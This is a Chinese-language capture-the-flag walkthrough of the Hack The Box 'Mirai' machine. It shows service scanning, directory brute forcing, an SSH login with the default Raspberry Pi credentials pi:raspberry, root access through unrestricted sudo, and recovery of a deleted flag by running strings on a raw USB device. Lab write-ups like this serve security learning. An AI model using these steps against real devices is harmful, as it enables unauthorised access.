# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测
```
┌──(root💀kali)-[~/htb/Mirai]
└─# nmap -Pn -sV 10.10.10.48 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-11 07:58 EST
Nmap scan report for 10.10.10.48
Host is up (0.31s latency).                                                                                                                                                                                         
Not shown: 65529 closed ports                                                                                                                                                                                       
PORT      STATE SERVICE VERSION                                                                                                                                                                                     
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)                                                                                                                                                
53/tcp    open  domain  dnsmasq 2.76                                                                                                                                                                                
80/tcp    open  http    lighttpd 1.4.35                                                                                                                                                                             
1935/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)                                                                                                                                              
32400/tcp open  http    Plex Media Server httpd                                                                                                                                                                     
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


80端口有一个cms的登录页面
cms名称： Pi-hole
版本： Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10

32400端口也有一个cms页面
cms名称：Plex 
版本：Version 3.9.1 




## 80端口目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.48/admin                                                                                                                         

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                             
                                                                                                                                                                                                                    
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.48/-admin_21-12-11_08-21-32.txt

Error Log: /root/dirsearch/logs/errors-21-12-11_08-21-32.log

Target: http://10.10.10.48/admin/

[08:21:33] Starting: 
[08:21:42] 301 -    0B  - /admin/.git  ->  http://10.10.10.48/admin/.git/  
[08:21:42] 200 -  274B  - /admin/.git/config                               
[08:21:42] 200 -   73B  - /admin/.git/description                          
[08:21:42] 200 -   23B  - /admin/.git/HEAD                                 
[08:21:42] 200 -  240B  - /admin/.git/info/exclude                         
[08:21:42] 200 -  182B  - /admin/.git/logs/HEAD                            
[08:21:42] 200 -  182B  - /admin/.git/logs/refs/heads/master               
[08:21:42] 301 -    0B  - /admin/.git/logs/refs/heads  ->  http://10.10.10.48/admin/.git/logs/refs/heads/
[08:21:42] 200 -  182B  - /admin/.git/logs/refs/remotes/origin/HEAD        
[08:21:42] 301 -    0B  - /admin/.git/logs/refs  ->  http://10.10.10.48/admin/.git/logs/refs/
[08:21:42] 301 -    0B  - /admin/.git/logs/refs/remotes/origin  ->  http://10.10.10.48/admin/.git/logs/refs/remotes/origin/
[08:21:42] 301 -    0B  - /admin/.git/refs/heads  ->  http://10.10.10.48/admin/.git/refs/heads/
[08:21:42] 301 -    0B  - /admin/.git/refs/remotes/origin  ->  http://10.10.10.48/admin/.git/refs/remotes/origin/
[08:21:42] 301 -    0B  - /admin/.git/logs/refs/remotes  ->  http://10.10.10.48/admin/.git/logs/refs/remotes/
[08:21:42] 301 -    0B  - /admin/.git/refs/remotes  ->  http://10.10.10.48/admin/.git/refs/remotes/
[08:21:42] 200 -   32B  - /admin/.git/refs/remotes/origin/HEAD
[08:21:42] 200 -   41B  - /admin/.git/refs/heads/master
[08:21:42] 200 -   11KB - /admin/.git/index                                
[08:21:42] 301 -    0B  - /admin/.git/refs/tags  ->  http://10.10.10.48/admin/.git/refs/tags/
[08:21:42] 200 -    1KB - /admin/.github/ISSUE_TEMPLATE.md                 
[08:21:42] 200 -    1KB - /admin/.github/PULL_REQUEST_TEMPLATE.md          
[08:21:42] 200 -  153B  - /admin/.gitignore/                               
[08:21:43] 200 -  107B  - /admin/.git/packed-refs                          
[08:21:43] 200 -  153B  - /admin/.gitignore                                
[08:21:44] 200 -  648B  - /admin/.pullapprove.yml                          
[08:21:48] 200 -  846B  - /admin/CONTRIBUTING.md                            
[08:21:49] 200 -    2KB - /admin/README.md                                  
[08:21:49] 200 -   14KB - /admin/LICENSE                                    
[08:22:12] 200 -  186B  - /admin/api.php                                    
[08:22:24] 200 -   14KB - /admin/debug.php                                  
[08:22:35] 301 -    0B  - /admin/img  ->  http://10.10.10.48/admin/img/     
[08:22:36] 200 -   14KB - /admin/index.php                                  
[08:22:36] 200 -   14KB - /admin/index.php/login/                           
[08:23:01] 301 -    0B  - /admin/scripts  ->  http://10.10.10.48/admin/scripts/
[08:23:02] 200 -   14KB - /admin/settings.php                               
[08:23:07] 301 -    0B  - /admin/style  ->  http://10.10.10.48/admin/style/ 

```



## 32400端口目录爆破
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.48:32400/web

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                             
                                                                                                                                                                                                                    
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.48-32400/-web_21-12-11_09-55-31.txt

Error Log: /root/dirsearch/logs/errors-21-12-11_09-55-31.log

Target: http://10.10.10.48:32400/web/

[09:55:33] Starting:    
[09:55:40] 200 -    0B  - /web/js                                                             
[09:56:15] 200 -    0B  - /web/common                                       
[09:56:15] 200 -    0B  - /web/common/                                      
[09:56:20] 200 -    0B  - /web/desktop/                                                                
[09:56:25] 200 -    5KB - /web/favicon.ico                                  
[09:56:30] 200 -    0B  - /web/img                                                          
[09:56:32] 200 -    4KB - /web/index.html                                   
[09:56:32] 200 -    0B  - /web/js/                                                    
[09:57:04] 200 -    0B  - /web/swf   

```
# 初始shell
经过一番谷歌搜索和研究，Pi-hole是一个轻量级的广告拦截器，一般安装在树莓派上。

也就是说，靶机很可能是一个树莓派机器

而树莓派的默认ssh密码是：```pi:raspberry```

尝试登陆
```
┌──(root💀kali)-[~/htb/Mirai]
└─# ssh pi@10.10.10.48     
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ whoami
pi
pi@raspberrypi:~ $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)

```

成功登陆！

# 提权

查看sudo特权
```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

```

可以直接提权到root,找到user.txt
```
pi@raspberrypi:~ $ sudo su
root@raspberrypi:/home/pi# find / -name user.txt
/home/pi/Desktop/user.txt

```

root.txt在U盘有备份
```
root@raspberrypi:/home/pi# find / -name root.txt
/lib/live/mount/persistence/sda2/root/root.txt
/root/root.txt
root@raspberrypi:/home/pi# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...

```

列出设备信息
```
root@raspberrypi:/media# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs


```

貌似是在
> sdb      8:16   0   10M  0 disk /media/usbstick

查看
```
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

还是要耍点花样。

查看```/dev/sdb```，原来是一个二进制文件
```
root@raspberrypi:/media/usbstick# ls -alh /dev/sdb
brw-rw---- 1 root disk 8, 16 Dec 11 12:53 /dev/sdb
```

直接用strings命令查看```/dev/sdb```
```
root@raspberrypi:/home/pi# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
{root.txt在此}
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James

```

# 总结
这台靶机的重点，主要是根据扫描出来的服务，理解搭建这些服务的用意，进而理解这个服务一般是运行在什么系统上。当得知是树莓派以后，使用树莓派的默认登录账号连到ssh，拿到初始shell。